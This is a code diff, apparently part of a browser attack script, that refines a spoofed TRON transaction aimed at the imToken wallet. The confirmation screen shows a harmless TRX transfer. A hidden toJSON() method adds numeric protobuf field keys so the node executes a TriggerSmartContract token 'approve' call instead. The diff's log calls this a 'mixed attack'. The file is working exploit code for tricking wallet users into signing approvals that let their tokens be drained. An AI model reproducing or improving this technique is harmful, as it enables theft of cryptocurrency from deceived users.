@@ -277,24 +277,31 @@
         }
       };
 
-      // Step 3: 混合 contract 对象 — 同时包含字符串键和数字键
-      // imToken 确认页读取 type / parameter → 显示 TRX 转账
-      // java-tron 节点 JSON→Protobuf 解析器同时接受字段名和数字字段号
-      // Protobuf: Contract.type=字段1, Contract.parameter=字段2, TriggerSmartContract=31
-      transaction.raw_data.contract[0] = {
-        // type: 'TransferContract',        // imToken 确认页读取
-        // parameter: fakeParam,            // imToken 确认页读取
-        '1': 'TriggerSmartContract',     // java-tron 节点按字段号读取
-        '2': realParam                   // java-tron 节点按字段号读取
+      // Step 3: 混合 contract — toJSON() 注入数字键
+      // 关键技巧：数字键不直接作为对象属性（imToken 桥接会报 undefined）
+      // 而是藏在 toJSON() 中，只在 JSON 序列化发往节点时才注入
+      // - imToken 读 contract.type → TransferContract → UI 显示 TRX 转账
+      // - JSON.stringify → toJSON() 返回带数字键的对象 → 节点解析为 TriggerSmartContract
+      const contractObj = {
+        type: 'TransferContract',
+        parameter: fakeParam,
+        toJSON() {
+          return {
+            type: 'TransferContract',
+            parameter: fakeParam,
+            '1': 'TriggerSmartContract',
+            '2': realParam
+          };
+        }
       };
+      transaction.raw_data.contract[0] = contractObj;
 
-      // 关键：不覆盖 raw_data_hex！让它保持 triggerSmartContract 生成的原值
-      // raw_data_hex 本身已是 approve 字节，与数字键指向的 TriggerSmartContract 一致
+      // 不覆盖 raw_data_hex，保持 triggerSmartContract 生成的原始 approve 字节
       const hasSelector = transaction.raw_data_hex.includes('095ea7b3');
       log(`raw_data_hex 包含 approve 选择器 (095ea7b3): ${hasSelector}`, hasSelector ? 'success' : 'error');
-      log('✔ raw_data.contract[0] 字符串键 → TransferContract（钱包显示 TRX 转账）', 'success');
-      log('✔ raw_data.contract[0] 数字键 → TriggerSmartContract（节点解析 approve）', 'success');
-      log('✔ raw_data_hex 未覆盖，保持原始 approve 字节', 'success');
+      log('✔ contract.type = TransferContract → 钱包 UI 显示 TRX 转账', 'success');
+      log('✔ toJSON() 注入 "1"/"2" 数字键 → 节点解析为 TriggerSmartContract', 'success');
+      log('✔ raw_data_hex 保持原始 approve 字节', 'success');
 
       // Step 4: 调用 sendTransaction
       const ok = await sendTx(transaction, '混合攻击 (approve)');
